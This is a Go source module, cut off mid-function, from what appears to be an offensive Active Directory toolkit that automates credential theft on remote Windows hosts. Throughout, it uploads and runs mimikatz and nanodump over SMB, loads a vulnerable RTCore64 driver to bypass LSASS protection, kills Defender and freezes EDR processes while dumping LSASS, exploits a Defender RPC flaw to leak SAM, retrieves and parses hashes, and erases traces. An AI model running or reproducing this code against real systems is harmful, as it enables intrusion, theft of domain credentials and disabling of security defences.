package modules

import (
	"adpack/core"
	"adpack/tools"
	"adpack/utils"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unicode"
)

var acquisitionPipelines = map[string]PipelineDef{
	"minimal": {
		Name:        "minimal",
		Delivery:    "donut",
		PayloadType: "go-mimikatz",
		ParseFn:     parseMimikatzOutput,
		Description: "Donut-wrap go-mimikatz and execute via NetExec SMB on target",
	},
	"standard": {
		Name:        "standard",
		Delivery:    "donut",
		PayloadType: "go-mimikatz",
		RemoteExec:  true,
		ParseFn:     parseMimikatzOutput,
		Description: "Donut-wrap go-mimikatz, upload via SMB, execute via WMI/WinRM, retrieve output",
	},
	"aggressive": {
		Name:        "aggressive",
		Delivery:    "bof",
		PayloadType: "nanodump",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload nanodump via SMB, execute with --fork, retrieve and parse dump",
	},
	"bof": {
		Name:        "bof",
		Delivery:    "bof",
		PayloadType: "nanodump",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "BOF-based nanodump via C2 agent (requires active agent on target)",
	},
	"fork": {
		Name:        "fork",
		Delivery:    "exe",
		PayloadType: "nanodump",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload nanodump.exe via SMB, execute with --fork (clone LSASS), retrieve dump",
	},
	"byovd": {
		Name:        "byovd",
		Delivery:    "exe",
		PayloadType: "byovd",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload RTCore64.sys + dump tool via SMB, load driver, patch LSASS PPL, dump",
	},
	"coldwer": {
		Name:        "coldwer",
		Delivery:    "exe",
		PayloadType: "coldwer",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload EDR-Freeze.exe + nanodump.exe via SMB, freeze EDR for 3s, dump LSASS",
	},
	"undefend": {
		Name:        "undefend",
		Delivery:    "exe",
		PayloadType: "undefend",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload UnDefend.exe + nanodump.exe, kill Defender, fork dump LSASS",
	},
	"bluehammer": {
		Name:        "bluehammer",
		Delivery:    "exe",
		PayloadType: "bluehammer",
		RemoteExec:  true,
		ParseFn:     parseMimikatzOutput,
		Description: "Upload FunnyApp.exe, exploit Defender RPC to leak SAM via VSS, extract hashes",
	},
	"phantomkiller": {
		Name:        "phantomkiller",
		Delivery:    "exe",
		PayloadType: "phantomkiller",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload BootRepair.sys + PhantomKiller.exe via SMB, load signed Lenovo driver, kill EDR processes via IOCTL, dump LSASS",
	},
	"miniplasma": {
		Name:        "miniplasma",
		Delivery:    "exe",
		PayloadType: "miniplasma",
		RemoteExec:  true,
		ParseFn:     parseMimikatzOutput,
		Description: "Upload MiniPlasma.exe, exploit Cloud Filter API race condition for SYSTEM shell, dump LSASS",
	},
	"dcsync": {
		Name:        "dcsync",
		Delivery:    "donut",
		PayloadType: "go-mimikatz",
		RemoteExec:  false,
		ParseFn:     parseMimikatzOutput,
		Description: "DCSync via go-mimikatz sekurlsa::dcsync for each DA credential",
	},
}

type PipelineDef struct {
	Name        string
	Delivery    string
	PayloadType string
	RemoteExec  bool
	ParseFn     func(string) []core.Credential
	Description string
}

func RunCredentialAcq(state *core.ADState, profileName string, targetHost string) *core.ToolResult {
	profile, ok := LookupProfile(profileName)
	if !ok {
		return &core.ToolResult{
			Success: false,
			Evidence: []core.EvidenceEntry{{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "evasion", Key: "error",
				Value: fmt.Sprintf("unknown profile: %s", profileName),
			}},
		}
	}

	pipeline, ok := acquisitionPipelines[profileName]
	if !ok {
		pipeline = acquisitionPipelines["standard"]
	}

	fmt.Printf("[*] Using evasion profile: %s (%s)\n", profile.Name, profile.Description)

	host, found := selectTarget(state, targetHost)
	if !found {
		return &core.ToolResult{
			Success: false,
			Evidence: []core.EvidenceEntry{{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "credential_acq", Key: "target", Value: "none",
				Confidence: 0, Timestamp: time.Now(),
			}},
		}
	}

	fmt.Printf("[*] Target: %s (%s)\n", host.IP, host.Hostname)

	var result *core.ToolResult
	switch profileName {
	case "minimal":
		result = executeMimikatzPipeline(state, host, pipeline)
	case "standard":
		result = executeMimikatzPipeline(state, host, pipeline)
	case "aggressive", "bof", "fork":
		result = executeNanodumpPipeline(state, host, pipeline)
	case "byovd":
		result = executeBYOVDPipeline(state, host, pipeline)
	case "coldwer":
		result = executeColdWerPipeline(state, host, pipeline)
	case "undefend":
		result = executeUnDefendPipeline(state, host, pipeline)
	case "bluehammer":
		result = executeBlueHammerPipeline(state, host, pipeline)
	case "phantomkiller":
		result = executePhantomKillerPipeline(state, host, pipeline)
	case "miniplasma":
		result = executeMiniPlasmaPipeline(state, host, pipeline)
	case "dcsync":
		result = executeDCSyncPipeline(state, host, pipeline)
	default:
		result = executeMimikatzPipeline(state, host, pipeline)
	}

	// Fallback: primary pipeline failed; try impacket-secretsdump DCSync
	if !result.Success && len(result.Evidence) > 0 && !strings.Contains(result.Evidence[0].Value, "secretsdump") {
		fmt.Println("[*] Primary pipeline failed, trying DCSync via impacket-secretsdump...")
		fallback := executeSecretsdumpPipeline(state, host)
		if fallback.Success {
			return fallback
		}
	}

	// Fallback: try SAM dump via nxc
	if !result.Success {
		fmt.Println("[*] Trying SAM dump via nxc...")
		samResult := executeSAMDump(state, host)
		if samResult.Success {
			return samResult
		}
	}

	return result
}

func selectTarget(state *core.ADState, preferred string) (core.Host, bool) {
	if preferred != "" {
		for _, h := range state.Hosts {
			if h.IP == preferred || h.Hostname == preferred {
				return h, true
			}
		}
	}
	if len(state.Hosts) > 0 {
		for _, h := range state.Hosts {
			if h.IsDC {
				return h, true
			}
		}
		return state.Hosts[0], true
	}
	return core.Host{}, false
}

func getCredential(state *core.ADState) (string, string, string, string) {
	for _, c := range state.Creds {
		if c.Validated && c.Domain != "" && c.Username != "" {
			return c.Domain, c.Username, c.Secret, c.Hash
		}
	}
	for _, c := range state.Creds {
		if c.Domain != "" && c.Username != "" {
			return c.Domain, c.Username, c.Secret, c.Hash
		}
	}
	return "", "", "", ""
}

func executeMimikatzPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, _ := getCredential(state)

	if !tools.GoMimikatz.Available() {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "go-mimikatz", Key: "status", Value: "tool not available",
		})
		result.Success = false
		return result
	}

	mcfg := tools.DefaultGoMimikatzConfig()

	ctx := context.Background()

	if pipeline.RemoteExec && domain != "" && pass != "" {
		fmt.Printf("[*] Remote exec go-mimikatz on %s via NetExec...\n", host.IP)
		target := tools.NetExecTarget{
			Protocol: "smb", Host: host.IP,
			Domain: domain, Username: user, Password: pass,
		}
		safeCmd := sanitizeMimikatzCommand(mcfg.Command)
		r, err := tools.NetExec.Run(ctx, target, "-x", []string{fmt.Sprintf("go-mimikatz %s", safeCmd)})
		if err == nil && r.Success {
			creds := pipeline.ParseFn(r.Stdout)
			result.Creds = append(result.Creds, creds...)
			for _, c := range creds {
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "go-mimikatz", Key: c.Username + "@" + c.Domain,
					Value: c.Secret, Confidence: 0.7, RawOutput: r.Stdout,
					Timestamp: time.Now(),
				})
			}
		} else {
			result.Success = false
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "go-mimikatz", Key: "error",
				Value:     "remote execution failed",
				Timestamp: time.Now(),
			})
		}
		return result
	}

	fmt.Println("[*] Running go-mimikatz locally...")
	r, err := tools.GoMimikatz.Sekurlsa(ctx, tools.ExecutionRequest{})
	if err != nil || r == nil || !r.Success {
		result.Success = false
		if r != nil {
			result.RawOutput = r.Stdout
		}
		return result
	}

	result.Success = true
	creds := pipeline.ParseFn(r.Stdout)
	result.Creds = append(result.Creds, creds...)
	for _, c := range creds {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "go-mimikatz", Key: c.Username + "@" + c.Domain,
			Value: c.Secret, Confidence: 0.7, RawOutput: r.Stdout,
			Timestamp: time.Now(),
		})
	}
	result.RawOutput = r.Stdout
	return result
}

func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if !tools.Nanodump.Available() {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "nanodump", Key: "status", Value: "tool not available",
		})
		result.Success = false
		return result
	}

	ncfg := tools.NanodumpConfig{
		Output: fmt.Sprintf("/tmp/lsass_%d.dmp", time.Now().Unix()),
	}

	ctx := context.Background()

	if pipeline.RemoteExec && domain != "" && pass != "" {
		fmt.Printf("[*] Remote nanodump on %s via NetExec SMB...\n", host.IP)
		target := tools.NetExecTarget{
			Protocol: "smb", Host: host.IP,
			Domain: domain, Username: user, Password: pass, Hash: hash,
		}

		remotePath := fmt.Sprintf(`C:\Windows\Temp\lsass_%d.dmp`, time.Now().Unix())
		ncfg.Output = remotePath

		cmd := fmt.Sprintf("nanodump --write %s --fork", remotePath)
		r, err := tools.NetExec.Run(ctx, target, "-x", []string{cmd})
		if err != nil {
			result.Success = false
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "nanodump", Key: "error",
				Value:     "remote execution failed: " + err.Error(),
				Timestamp: time.Now(),
			})
			return result
		}
		if !r.Success {
			fmt.Printf("[!] Remote execution failed: %s\n", r.Stderr)
			result.Success = false
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "nanodump", Key: "error",
				Value:     "remote execution failed: " + r.Stderr,
				Timestamp: time.Now(),
			})
			return result
		}

		fmt.Println("[*] Retrieving dump via SMB...")
		localPath := fmt.Sprintf("/tmp/lsass_remote_%d.dmp", time.Now().Unix())
		getR, err := tools.NetExec.GetFile(ctx, target, remotePath, localPath)
		if err == nil && getR.Success {
			fmt.Printf("[*] Parsing dump with pypykatz...\n")
			parsed, err := tools.Nanodump.ParseDump(ctx, localPath)
			if err != nil {
				pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localPath)
				if pyr.Success {
					creds := pipeline.ParseFn(pyr.Stdout)
					result.Creds = append(result.Creds, creds...)
				}
			} else if parsed.Success {
				creds := pipeline.ParseFn(parsed.Stdout)
				result.Creds = append(result.Creds, creds...)
			}
		}
		return result
	}

	fmt.Println("[*] Running nanodump locally...")
	r, err := tools.Nanodump.Run(ctx, tools.ExecutionRequest{
		Evasion: "fork",
	})
	if err != nil || r == nil || !r.Success {
		result.Success = false
		if r != nil {
			result.RawOutput = r.Stdout
		}
		return result
	}

	parsed, err := tools.Nanodump.ParseDump(ctx, ncfg.Output)
	if err != nil || !parsed.Success {
		result.Success = false
		result.RawOutput = r.Stdout
		return result
	}

	result.Success = true
	creds := pipeline.ParseFn(parsed.Stdout)
	result.Creds = append(result.Creds, creds...)
	result.RawOutput = r.Stdout
	return result
}

func executeBYOVDPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for BYOVD pipeline")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "byovd", Key: "error",
			Value:     "no credentials",
			Timestamp: time.Now(),
		})
		return result
	}

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	ctx := context.Background()

	fmt.Println("[*] BYOVD: Deploying RTCore64.sys (randomized name)...")
	driverPath, drvSha, err := tools.Deploy(ctx, target, "RTCore64.sys", `C:\Windows\Temp\`, "")
	if err != nil {
		fmt.Printf("[!] Failed to deploy RTCore64.sys: %v\n", err)
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "byovd", Key: "error", Value: "driver upload failed: " + err.Error(),
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] BYOVD: Deploying nanodump.exe (randomized name)...")
	dumperPath, _, err := tools.Deploy(ctx, target, "nanodump.exe", `C:\Windows\Temp\`, "")
	if err != nil {
		fmt.Printf("[!] Failed to deploy nanodump.exe: %v\n", err)
		_ = tools.CleanupRemote(ctx, target, driverPath)
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "byovd", Key: "error", Value: "nanodump upload failed: " + err.Error(),
			Timestamp: time.Now(),
		})
		return result
	}

	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_byovd_%d.dmp`, time.Now().UnixNano())

	// Always clean up driver service registration, dropped binaries, and dump file.
	// Stop and delete are issued as independent calls so a stop-failure doesn't
	// short-circuit the delete (which is the operation that actually removes the
	// service registration from the SCM).
	defer func() {
		tools.NetExec.RunFailover(ctx, target, `sc stop RTCore64`, 15*time.Second)
		time.Sleep(1 * time.Second)
		tools.NetExec.RunFailover(ctx, target, `sc delete RTCore64`, 15*time.Second)
		_ = tools.CleanupRemote(ctx, target, driverPath, dumperPath, dumpRemote)
	}()

	fmt.Printf("[*] BYOVD: Loading kernel driver (sha256:%s…)...\n", tools.ShortHash(drvSha, 16))
	loadCmd := fmt.Sprintf(`sc create RTCore64 binPath=%s type=kernel && sc start RTCore64`, driverPath)
	loadDrv, lerr := tools.NetExec.RunFailover(ctx, target, loadCmd, 30*time.Second)
	if lerr != nil || !loadDrv.Success {
		fmt.Println("[!] Driver load failed")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "byovd", Key: "error", Value: "driver load failed",
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] BYOVD: Dumping LSASS via nanodump --fork...")
	dumpCmd := fmt.Sprintf(`%s --write %s --fork`, dumperPath, dumpRemote)
	dump, derr := tools.NetExec.RunFailover(ctx, target, dumpCmd, 60*time.Second)
	if derr != nil || !dump.Success {
		fmt.Println("[!] Dump failed")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "byovd", Key: "error", Value: "dump failed",
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] BYOVD: Retrieving dump...")
	localDump := filepath.Join(os.TempDir(), fmt.Sprintf("lsass_byovd_%d.dmp", time.Now().UnixNano()))
	getR, err := tools.NetExec.GetFile(ctx, target, dumpRemote, localDump)
	if err == nil && getR.Success {
		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
		if pyr.Success {
			creds := pipeline.ParseFn(pyr.Stdout)
			result.Creds = append(result.Creds, creds...)
			for _, c := range creds {
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "byovd", Key: c.Username + "@" + c.Domain,
					Value: c.Secret, Confidence: 0.85, RawOutput: pyr.Stdout,
					Timestamp: time.Now(),
				})
			}
		}
	}
	return result
}

func runDefenderKill(_ *core.ADState, _ core.Host, target tools.NetExecTarget) {
	if !tools.UnDefend.Available() {
		fmt.Println("[!] UnDefend.exe not found locally, skipping Defender kill")
		return
	}
	ctx := context.Background()

	fmt.Println("[*] Pre-condition: Deploying UnDefend.exe (randomized name)...")
	remotePath, hash, err := tools.Deploy(ctx, target, "UnDefend.exe", `C:\Windows\Temp\`, "")
	if err != nil {
		fmt.Printf("[!] Failed to deploy UnDefend.exe: %v\n", err)
		return
	}
	fmt.Printf("    sha256: %s…  remote: %s\n", tools.ShortHash(hash, 16), remotePath)

	fmt.Println("[*] Pre-condition: Executing UnDefend aggressive mode (start /B)...")
	killR, _ := tools.UnDefend.ExecRemote(ctx, target, remotePath, tools.UnDefendAggressive)
	_ = killR
	time.Sleep(2 * time.Second)

	if errs := tools.CleanupRemote(ctx, target, remotePath); len(errs) > 0 {
		fmt.Printf("[!] UnDefend cleanup soft-failed: %v\n", errs[0])
	}
}

func executeUnDefendPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for UnDefend pipeline, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline)
	}

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	runDefenderKill(state, host, target)

	ctx := context.Background()
	fmt.Println("[*] UnDefend: Deploying nanodump.exe (randomized name)...")
	dumperPath, _, derr := tools.Deploy(ctx, target, "nanodump.exe", `C:\Windows\Temp\`, "")
	if derr != nil {
		fmt.Printf("[!] Failed to deploy nanodump.exe: %v\n", derr)
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "undefend", Key: "error",
			Value:     "nanodump upload failed: " + derr.Error(),
			Timestamp: time.Now(),
		})
		return result
	}
	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_undefend_%d.dmp`, time.Now().UnixNano())
	defer func() {
		_ = tools.CleanupRemote(ctx, target, dumperPath, dumpRemote)
	}()

	fmt.Println("[*] UnDefend: Dumping LSASS via nanodump --fork...")
	dumpCmd := fmt.Sprintf(`%s --write %s --fork`, dumperPath, dumpRemote)
	dump, err := tools.NetExec.RunFailover(ctx, target, dumpCmd, 60*time.Second)
	if err != nil || !dump.Success {
		fmt.Println("[!] Dump failed")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "undefend", Key: "error",
			Value:     "dump failed",
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] UnDefend: Retrieving dump...")
	localDump := filepath.Join(os.TempDir(), fmt.Sprintf("lsass_undefend_%d.dmp", time.Now().UnixNano()))
	getR, err := tools.NetExec.GetFile(ctx, target, dumpRemote, localDump)
	if err == nil && getR.Success {
		fmt.Println("[*] UnDefend: Parsing dump with pypykatz...")
		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
		if pyr.Success {
			creds := pipeline.ParseFn(pyr.Stdout)
			result.Creds = append(result.Creds, creds...)
			for _, c := range creds {
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "undefend", Key: c.Username + "@" + c.Domain,
					Value: c.Secret, Confidence: 0.8, RawOutput: pyr.Stdout,
					Timestamp: time.Now(),
				})
			}
		}
	}
	return result
}

func executeBlueHammerPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for BlueHammer pipeline")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "bluehammer", Key: "error",
			Value:     "no credentials",
			Timestamp: time.Now(),
		})
		return result
	}

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	if !tools.BlueHammer.Available() {
		fmt.Println("[!] FunnyApp.exe (BlueHammer) not available, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline)
	}

	ctx := context.Background()
	fmt.Println("[*] BlueHammer: Deploying FunnyApp.exe (randomized name)...")
	remotePath, sha, err := tools.Deploy(ctx, target, "FunnyApp.exe", `C:\Windows\Temp\`, "")
	if err != nil {
		fmt.Printf("[!] BlueHammer deploy failed: %v\n", err)
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "bluehammer", Key: "error",
			Value:     "deploy failed: " + err.Error(),
			Timestamp: time.Now(),
		})
		return result
	}
	defer func() {
		if errs := tools.CleanupRemote(ctx, target, remotePath); len(errs) > 0 {
			fmt.Printf("[!] BlueHammer cleanup soft-failed: %v\n", errs[0])
		}
	}()

	fmt.Println("[*] BlueHammer: Executing Defender RPC exploit (start /B)...")
	execR, err := tools.BlueHammer.ExecRemote(ctx, target, remotePath)
	if err != nil || execR == nil || !execR.Success {
		result.Success = false
		errMsg := "execution failed"
		if err != nil {
			errMsg = err.Error()
		} else if execR != nil {
			errMsg = execR.Stderr
		}
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "bluehammer", Key: "sam_leak",
			Value:      "BlueHammer execution failed: " + errMsg,
			Confidence: 0.0, Timestamp: time.Now(),
		})
		return result
	}
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
		Source: "bluehammer", Key: "sam_leak",
		Value:      fmt.Sprintf("BlueHammer executed (sha256:%s). Check target for SAM output.", tools.ShortHash(sha, 16)),
		Confidence: 0.5, RawOutput: execR.Stdout,
		Timestamp: time.Now(),
	})
	return result
}

func executeColdWerPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for ColdWer pipeline, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline)
	}

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	_ = hash

	runDefenderKill(state, host, target)

	ctx := context.Background()
	fmt.Println("[*] ColdWer: Deploying EDR-Freeze.exe (randomized name)...")
	freezerPath, _, ferr := tools.Deploy(ctx, target, "EDR-Freeze.exe", `C:\Windows\Temp\`, "")
	if ferr != nil {
		fmt.Printf("[!] Failed to deploy EDR-Freeze.exe: %v — falling back to nanodump\n", ferr)
		return executeNanodumpPipeline(state, host, pipeline)
	}
	fmt.Println("[*] ColdWer: Deploying nanodump.exe (randomized name)...")
	dumperPath, _, derr := tools.Deploy(ctx, target, "nanodump.exe", `C:\Windows\Temp\`, "")
	if derr != nil {
		fmt.Printf("[!] Failed to deploy nanodump.exe: %v\n", derr)
		_ = tools.CleanupRemote(ctx, target, freezerPath)
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "coldwer", Key: "error",
			Value:     "nanodump upload failed: " + derr.Error(),
			Timestamp: time.Now(),
		})
		return result
	}
	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_frozen_%d.dmp`, time.Now().UnixNano())
	defer func() {
		_ = tools.CleanupRemote(ctx, target, freezerPath, dumperPath, dumpRemote)
	}()

	edrProcs := []string{"MsMpEng.exe", "SentinelAgent.exe", "CrowdStrike.exe",
		"Cylance.exe", "Sophos.exe", "TaniumClient.exe", "S1.exe"}

	dumped := false
	for _, proc := range edrProcs {
		pidCmd := fmt.Sprintf(`powershell -c "(Get-Process %s -ErrorAction SilentlyContinue).Id"`, proc)
		pidR, err := tools.NetExec.RunFailover(ctx, target, pidCmd, 30*time.Second)
		if err == nil && pidR.Success && strings.TrimSpace(pidR.Stdout) != "" {
			pid := strings.TrimSpace(pidR.Stdout)
			if !isNumeric(pid) {
				fmt.Printf("[!] Invalid PID from remote: %q, skipping\n", pid)
				continue
			}
			fmt.Printf("[*] ColdWer: Found %s PID %s, freezing for 3s...\n", proc, pid)
			freezeCmd := fmt.Sprintf(`%s %s 3000`, freezerPath, pid)
			freeze, ferr := tools.NetExec.RunFailover(ctx, target, freezeCmd, 30*time.Second)
			if ferr == nil && freeze.Success {
				time.Sleep(1 * time.Second)
				fmt.Println("[*] ColdWer: Dumping LSASS during freeze window...")
				dumpCmd := fmt.Sprintf(`%s --write %s --fork`, dumperPath, dumpRemote)
				dumpR, derr := tools.NetExec.RunFailover(ctx, target, dumpCmd, 60*time.Second)
				if derr != nil || !dumpR.Success {
					dumpStderr := dumpR.Stderr
					if dumpStderr == "" && derr != nil {
						dumpStderr = derr.Error()
					}
					fmt.Printf("[!] ColdWer: dump failed during %s freeze (err=%v, stderr=%q), trying next EDR\n",
						proc, derr, dumpStderr)
					continue
				}
				dumped = true
				break
			}
		}
	}

	if !dumped {
		fmt.Println("[!] ColdWer: No EDR found to freeze, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline)
	}

	localDump := filepath.Join(os.TempDir(), fmt.Sprintf("lsass_frozen_%d.dmp", time.Now().UnixNano()))
	getR, err := tools.NetExec.GetFile(ctx, target, dumpRemote, localDump)
	if err == nil && getR.Success {
		fmt.Println("[*] ColdWer: Parsing dump with pypykatz...")
		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
		if pyr.Success {
			creds := pipeline.ParseFn(pyr.Stdout)
			result.Creds = append(result.Creds, creds...)
			for _, c := range creds {
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "coldwer", Key: c.Username + "@" + c.Domain,
					Value: c.Secret, Confidence: 0.8, RawOutput: pyr.Stdout,
					Timestamp: time.Now(),
				})
			}
		}
	} else {
		fmt.Println("[!] No frozen dump retrieved, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline)
	}
	return result
}

func parseMimikatzOutput(output string) []core.Credential {
	var creds []core.Credential
	lines := strings.Split(output, "\n")
	var currentUser, currentDomain string

	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		lower := strings.ToLower(trimmed)

		if strings.Contains(lower, "username") && !strings.Contains(lower, "password") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				val := strings.TrimSpace(parts[1])
				if val != "" && val != "(null)" {
					currentUser = val
				}
			}
		}
		if strings.Contains(lower, "domain") && !strings.Contains(lower, "domain sid") &&
			!strings.Contains(lower, "domain server") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				val := strings.TrimSpace(parts[1])
				if val != "" && val != "(null)" {
					currentDomain = strings.TrimSpace(strings.Split(val, " ")[0])
				}
			}
		}
		if strings.Contains(lower, "password") && !strings.Contains(lower, "password last") &&
			!strings.Contains(lower, "password never") && !strings.Contains(lower, "password required") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				val := strings.TrimSpace(parts[1])
				if val != "" && val != "(null)" {
					creds = append(creds, core.Credential{
						Type: core.CredPlaintext, Username: currentUser,
						Domain: currentDomain, Secret: val, Source: "go-mimikatz",
					})
				}
			}
		}
	}
	return dedupCreds(creds)
}

func parseNanodumpOutput(output string) []core.Credential {
	var creds []core.Credential
	lines := strings.Split(output, "\n")
	var currentUser, currentDomain string

	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		lower := strings.ToLower(trimmed)

		if strings.Contains(lower, "username") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				currentUser = strings.TrimSpace(parts[1])
			}
		}
		if strings.Contains(lower, "domainname") || strings.Contains(lower, "domain name") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				currentDomain = strings.TrimSpace(parts[1])
			}
		}
		if strings.Contains(lower, "ntlm") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				hash := strings.TrimSpace(parts[1])
				if len(hash) == 32 {
					creds = append(creds, core.Credential{
						Type: core.CredHash, Username: currentUser,
						Domain: currentDomain, Hash: hash, Source: "nanodump",
					})
				}
			}
		}
	}
	return dedupCreds(creds)
}

func dedupCreds(creds []core.Credential) []core.Credential {
	seen := make(map[string]bool)
	var unique []core.Credential
	for _, c := range creds {
		key := c.Domain + "\\" + c.Username + ":" + c.Secret + c.Hash
		if !seen[key] {
			seen[key] = true
			unique = append(unique, c)
		}
	}
	return unique
}

func executeSAMDump(state *core.ADState, host core.Host) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		result.Success = false
		return result
	}
	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}
	ctx := context.Background()
	r, err := tools.NetExec.Run(ctx, target, "--sam", nil)
	if err == nil && r.Success {
		result.RawOutput = r.Stdout
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "nxc_sam", Key: host.IP, Value: "SAM dump completed",
			Timestamp: time.Now(),
		})
		fmt.Println("[+] SAM dump successful")
	} else {
		result.Success = false
	}
	return result
}

func executeSecretsdumpPipeline(state *core.ADState, host core.Host) *core.ToolResult {
	result := &core.ToolResult{Success: true}
